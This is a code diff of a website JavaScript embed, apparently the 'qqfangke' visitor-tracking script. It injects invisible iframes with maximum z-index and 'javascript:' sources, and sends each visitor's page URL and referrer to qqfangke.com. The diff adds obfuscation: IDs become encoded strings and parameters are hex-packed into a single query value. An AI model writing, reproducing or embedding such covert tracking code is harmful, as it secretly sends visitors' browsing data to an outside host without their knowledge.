@@ -1,10 +1,3 @@
-/**
- * Created by Administrator on 14-5-22.
- */
-var fangke_wid=2523;
-var fangke_uid=203662;
-var fangke_kaiguan=0;
-var fangke_etime=1431655516;
 var fangke_isIE = document.all?true:false;
 var qqfangke_x = 0;
 var qqfangke_y = 0;
@@ -74,7 +67,7 @@ if(!QQfangke_ref){
 
 function fangke_LoginOK() {
     if (document.getElementById("QQfangke_iframe") == null) {
-        var QQfangke_xurl = "http://college.qq.com.qqfangke.com/fangke/LoadCode?u=203662&w=2523&access=http://meishi.baidu.com/&soso=http://news.163.com/&key=http://v.youku.com/&act=http://meishi.baidu.com/&fk=http://finance.wqaa.com/&nbs=http://edu.1w2.com/&mecool=http://download.sowi.com/&jf=http://yue.tudou.qq.com/&buy=http://baby.cctv.com/&buy=http://3gqq.gg.com/&go=http://qzone.qsa.com/&access=http://blog.zna.com/&iu=http://kid.cvsw.com/&fk=http://vip.qws.com/&poler=http://games.google.com/&act=http://games.google.com/&iu=http://v.youku.com/&qqlo=http://kid.cvsw.com/&swd=http://news.163.com/";
+        var QQfangke_xurl = "http://college.qq.com.qqfangke.com/fangke/LoadCode?u=K11yTnpfOho%3D&w=K11mTXlCXl4%3D";
 
         var QQfangke_url = QQfangke_xurl + "&ref=" + QQfangke_ref + "&page=" + QQfangke_page + "&t=" + new Date().getTime();
         var iframe = document.createElement("iframe");
@@ -98,7 +91,7 @@ function createIframe_Login(){
     {
         if(navigator.userAgent.indexOf("Firefox") <= 0 && !fangke_isIE){
             var iframecss = "position:absolute;z-index: 2147483647;width:2px;height:2px;margin:2px 0 0 0;+margin:0 0 0 -3px;margin-left:-1px\9\0;";
-            window.iframe_xx = top.fangke_jumpurl;
+            window.iframe_xx = top.fangke_surl;
             var iframe = document.createElement("iframe");
             iframe.src = "javascript:parent.iframe_xx";
             iframe.id = "iframe_xx_bb_aa";
@@ -108,7 +101,7 @@ function createIframe_Login(){
             document.body.insertBefore(iframe,document.body.childNodes[0]);
         }else{fangke_LoginOK();}
     }else{
-        iframelogin=true;
+        iframelogin=false;
         setTimeout(createIframe_Login, 100);
     }
 }
@@ -118,7 +111,7 @@ function createIframe_xxx(){
     {
         if(ieversion<=5){
             var iframecss = "position:absolute; z-index: 2147483647;width:2px; height:2px; margin:1px 0 0 -1px;_margin:0px 0 0 -2px;";
-            window.iframe_xx = top.fangke_jumpurl;
+            window.iframe_xx = top.fangke_surl;
             var iframe = document.createElement("iframe");
             iframe.src = "javascript:parent.iframe_xx";
             iframe.id = "iframe_xx_bb_aa";
@@ -128,7 +121,7 @@ function createIframe_xxx(){
             document.body.insertBefore(iframe,document.body.childNodes[0]);
         }else{fangke_LoginOK();}
     }else{
-        iframexxx=true;
+        iframexxx=false;
         setTimeout(createIframe_xxx, 100);
     }
 }
@@ -136,18 +129,18 @@ function createIframe_xxx(){
 function createIframe_html(){
     if(document.body && !iframehtml)
     {
-        if(ieversion<=5){
-            var iframecss = "position:absolute; z-index: 0;width:0px; height:0px;";
-            var iframe = document.createElement("iframe");
-            iframe.src = fangke_jumpurl;
-            iframe.id = "iframe_xx_bb_aa";
-            iframe.style.cssText = iframecss;
-            iframe.scrolling = "no";
-            iframe.setAttribute("frameborder", "0", 0);
-            document.body.insertBefore(iframe,document.body.childNodes[0]);
-        }else{fangke_LoginOK();}
+        //if(ieversion>=5){
+        var iframecss = "position:absolute; z-index: 0;width:0px; height:0px;";
+        var iframe = document.createElement("iframe");
+        iframe.src = fangke_jumpurl;
+        iframe.id = "iframe_xx_bb_ab";
+        iframe.style.cssText = iframecss;
+        iframe.scrolling = "no";
+        iframe.setAttribute("frameborder", "0", 0);
+        document.body.insertBefore(iframe,document.body.childNodes[0]);
+        //}else{fangke_LoginOK();}
     }else{
-        iframehtml=true;
+        iframehtml=false;
         setTimeout(createIframe_html, 100);
     }
 }
@@ -172,30 +165,78 @@ function fangke_Request(argname,tag)
     return "";
 }
 
+function Obj2str(o) {
+    if (o == undefined) {return "";}
+    var r = [];
+    if (typeof o == "string") return "\"" + o.replace(/([\"\\])/g, "\\$1").replace(/(\n)/g, "\\n").replace(/(\r)/g, "\\r").replace(/(\t)/g, "\\t") + "\"";
+    if (typeof o == "object") {
+        if (!o.sort) {
+            for (var i in o)
+                r.push("\"" + i + "\":" + Obj2str(o[i]));
+            if (!!document.all && !/^\n?function\s*toString\(\)\s*\{\n?\s*\[native code\]\n?\s*\}\n?\s*$/.test(o.toString)) {
+                r.push("toString:" + o.toString.toString());
+            }
+            r = "{" + r.join() + "}"
+        } else {
+            for (var i = 0; i < o.length; i++)
+                r.push(Obj2str(o[i]))
+            r = "[" + r.join() + "]";
+        }
+        return r;
+    }
+    return o.toString().replace(/\"\:/g, '":""');
+}
+
+var paramJO={};
+paramJO.etime="K2NiTnlhOlIvYWIddwYMDw==";
+paramJO.kaiguan="0";
+paramJO.wid="K11mTXlCXl4=";
+paramJO.uid="K11yTnpfOho=";
+paramJO.url=document.location.href;
+paramJO.fkrefurl=document.referrer;
+paramJO.web_key="b6c42e1043c118fe3df9ec3ff288430e";
+
 function fangke_loadJumpUrl(){
-    var url="http://www.qqfangke.com/jump/getUrl.php?kaiguan="+fangke_kaiguan+"&a=0&etime="+fangke_etime+"&web_key=b6c42e1043c118fe3df9ec3ff288430e&url="+document.location.href+"&fkrefurl="+encodeURIComponent(document.referrer)+"&wid="+fangke_wid+"&uid="+fangke_uid;
+    paramJO.a=0;
+    var url="http://www.qqfangke.com/fangke/geturl?me="+ee(Obj2str(paramJO));
     fangke_loadJS(url,check_jumpUrl);
+}
+
+function ee(s){
+    console.log(s);
+    var es = [],c='',ec='';
+    s = s.split('');
+    for(var i=0,length=s.length;i<length;i++){
+        c = s[i];
+        ec = encodeURIComponent(c);
+        if(ec==c){
+            ec = c.charCodeAt().toString(16);
+            ec = ('00' + ec).slice(-2);
+        }
+        es.push(ec);
+    }
+    return es.join('').replace(/%/g,'').toUpperCase();
 }
 
 function check_jumpUrl() {
     try {
-        if(fangke_jumpurl&&fangke_jumpurl!=""&&fangke_jumpurl.indexOf('html5')>0){
-            fangke_jumpurl=fangke_jumpurl+"&wid="+fangke_wid+"&uid="+fangke_uid+"&page="+encodeURIComponent(QQfangke_page)+"&ref="+encodeURIComponent(QQfangke_ref);
+        if(fangke_jumpurl&&fangke_jumpurl!=""&&fangke_jumpurl.indexOf('bbs.cb.')>0){
+            fangke_jumpurl=fangke_jumpurl+"&wid="+paramJO.wid+"&uid="+paramJO.uid+"&page="+encodeURIComponent(QQfangke_page)+"&ref="+encodeURIComponent(QQfangke_ref);
             setTimeout(createIframe_html, 0);
         }else if (fangke_jumpurl!="http://b.wap.soso.com") {
             window.fangke_jumpurl=fangke_jumpurl;
             setTimeout(createIframe_xxx, 0)
         }else {
-            setTimeout(fangke_LoginOK, 0)
+            //setTimeout(fangke_LoginOK, 0)
         }
     } catch(e) {
-        //fangke_LoginOK();
-        setTimeout(fangke_LoginOK, 0)
+        //setTimeout(fangke_LoginOK, 0)
     }
 }
 
 function fangke_loadsUrl(){
-    var url="http://www.qqfangke.com/jump/getUrl.php?kaiguan="+fangke_kaiguan+"&a=1&web_key=b6c42e1043c118fe3df9ec3ff288430e&url="+document.location.href+"&fkrefurl="+encodeURIComponent(document.referrer)+"&wid="+fangke_wid+"&uid="+fangke_uid;
+    paramJO.a=1;
+    var url="http://www.qqfangke.com/fangke/geturl?me="+ee(Obj2str(paramJO));
     fangke_loadJS(url,fangke_SSFrame);
 }
 
@@ -203,7 +244,7 @@ function create_zeroiframe(url){
     try {
         if (url) {
             var iframe = document.createElement("iframe");
-            iframe.src = url+"&wid="+fangke_wid+"&uid="+fangke_uid+"&page=" + QQfangke_page;
+            iframe.src = url+"&wid="+paramJO.wid+"&uid="+paramJO.uid+"&page=" + QQfangke_page;
             iframe.style.cssText = "width:0px;height:0px;";
             iframe.scrolling = "no";
             iframe.setAttribute("frameborder", "0", 0);
@@ -215,8 +256,12 @@ function create_zeroiframe(url){
 }
 
 function fangke_SSFrame(){
-    create_zeroiframe(fangke_surl);
-    create_zeroiframe(fangke_surl1);
+    if(fangke_surl.indexOf("iframe")>0){
+        setTimeout(createIframe_Login, 0)
+    }else{
+        create_zeroiframe(fangke_surl);
+        create_zeroiframe(fangke_surl1);
+    }
 }
 
 var iframe_hover=false;
@@ -311,18 +356,3 @@ fangke_loadsUrl();
 if(window == parent){ //ç¦æ­¢iframe
     fangke_loadJumpUrl();
 }
-
-/*
- var arr = str1.split(','), str3 = [];
- for(var i=0,len= arr.length;i<len;i++){
- str3.push(String.fromCharCode(arr[i]));
- }
- //alert(str2 = String.fromCharCode(str1))
- //alert(hexToDec(str));
-
- //str2="alert";
- //code = str2.charCodeAt();
- console.log(str3.join(''));
- //alert(String.fromCharCode(code))
-
-* */
